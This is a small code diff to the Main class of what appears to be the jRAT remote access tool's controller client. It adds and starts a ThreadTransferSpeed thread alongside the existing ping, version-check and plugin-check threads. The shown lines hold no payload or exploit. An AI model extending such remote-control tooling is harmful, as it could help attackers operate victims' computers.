@@ -25,6 +25,7 @@ import se.jrat.client.threads.RunnableCheckPlugins;
 import se.jrat.client.threads.RunnableNetworkCounter;
 import se.jrat.client.threads.ThreadCheckVersion;
 import se.jrat.client.threads.ThreadPing;
+import se.jrat.client.threads.ThreadTransferSpeed;
 import se.jrat.client.ui.dialogs.DialogEula;
 import se.jrat.client.ui.frames.Frame;
 import se.jrat.client.utils.TrayIconUtils;
@@ -130,6 +131,7 @@ public class Main {
 		new ThreadCheckVersion().start();
 		new Thread(new RunnableCheckPlugins()).start();
 		new ThreadPing().start();
+		new ThreadTransferSpeed().start();
 
 		instance.setVisible(true);
 
